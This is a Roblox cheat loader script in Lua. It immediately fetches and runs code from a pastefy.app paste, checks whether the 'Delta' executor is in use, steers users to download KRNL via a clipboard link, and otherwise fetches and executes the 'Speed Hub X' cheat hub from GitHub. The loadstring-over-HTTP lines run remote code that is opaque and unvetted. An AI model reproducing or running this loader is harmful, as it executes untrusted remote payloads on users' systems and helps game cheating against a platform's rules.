loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
--// Delta Executor Detection
local function isDelta()
    local deltaIdentifiers = {
        identifyexecutor and identifyexecutor():lower():find("delta"),
        getexecutorname and getexecutorname():lower():find("delta"),
        is_delta and type(is_delta) == "function",
        DELTA_INTERNAL and type(DELTA_INTERNAL) == "table"
    }

    for _, v in pairs(deltaIdentifiers) do
        if v then return true end
    end

    return false
end

--// Theme Colors
local bgColor = Color3.fromRGB(20, 20, 20)
local borderColor = Color3.fromRGB(255, 0, 0)
local textColor = Color3.fromRGB(255, 255, 255)

--// Create Border Frame
local function createFramedWindow(name, width, height, titleText)
    local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    gui.Name = name

    local border = Instance.new("Frame", gui)
    border.Size = UDim2.new(0, width + 8, 0, height + 8)
    border.Position = UDim2.new(0.5, -(width + 8)/2, 0.5, -(height + 8)/2)
    border.BackgroundColor3 = borderColor
    border.BorderSizePixel = 0

    local main = Instance.new("Frame", border)
    main.Size = UDim2.new(0, width, 0, height)
    main.Position = UDim2.new(0, 4, 0, 4)
    main.BackgroundColor3 = bgColor
    main.BorderSizePixel = 0

    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = titleText
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 24
    title.TextColor3 = textColor

    return gui, main
end

--// Loading Screen
local function showLoadingUI()
    local gui, main = createFramedWindow("DeltaCheckLoading", 280, 80, "Detecting Delta...")
    return gui
end

--// Block UI
local function showBlockedUI()
    local gui, main = createFramedWindow("DeltaBlocked", 320, 160, "❌ Delta Executor Detected")

    local msg = Instance.new("TextLabel", main)
    msg.Size = UDim2.new(1, -20, 0.4, 0)
    msg.Position = UDim2.new(0, 10, 0.3, 0)
    msg.Text = "Please use KRNL instead to run this script."
    msg.Font = Enum.Font.SourceSans
    msg.TextSize = 18
    msg.TextColor3 = textColor
    msg.BackgroundTransparency = 1
    msg.TextWrapped = true
    msg.TextXAlignment = Enum.TextXAlignment.Center

    local btn = Instance.new("TextButton", main)
    btn.Size = UDim2.new(0.6, 0, 0.2, 0)
    btn.Position = UDim2.new(0.2, 0, 0.75, 0)
    btn.Text = "Copy KRNL Download"
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = 18
    btn.TextColor3 = textColor
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.BorderSizePixel = 0

    btn.MouseButton1Click:Connect(function()
        setclipboard("https://krnl.vip")
        btn.Text = "Copied!"
        task.wait(1.5)
        btn.Text = "Copy KRNL Download"
    end)
end

--// Main Logic
local loadingUI = showLoadingUI()
task.wait(2) -- simulate detection
loadingUI:Destroy()

if isDelta() then
    showBlockedUI()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end
